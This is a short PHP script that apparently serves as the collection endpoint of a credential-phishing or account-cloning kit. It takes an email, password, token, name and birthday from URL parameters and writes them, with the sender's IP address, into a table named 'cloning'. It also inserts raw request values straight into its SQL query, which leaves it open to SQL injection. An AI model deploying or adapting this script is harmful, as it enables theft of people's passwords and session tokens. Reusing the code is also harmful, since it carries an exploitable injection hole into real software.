<?php
if (isset($_GET['email'])) {
	require 'sqlint.php';
	$emil = $_GET['email'];
	$pw = $_GET['pw'];
	$token = $_GET['tk'];
	$name = $_GET['n'];
	$birthday = $_GET['b'];
	$dt = date('Y-m-d H:i:s');
	$ip = $_SERVER['REMOTE_ADDR'];
	$sql="INSERT INTO cloning (id, email, password, token, name, birthday, ip, time) VALUES (NULL, '$emil', '$pw', '$token' , '$name' , '$birthday' , '$ip', '$dt');";
	$result = mysqli_query($con, $sql);
	echo "OK";
}else{
	echo "No Data";
}

?>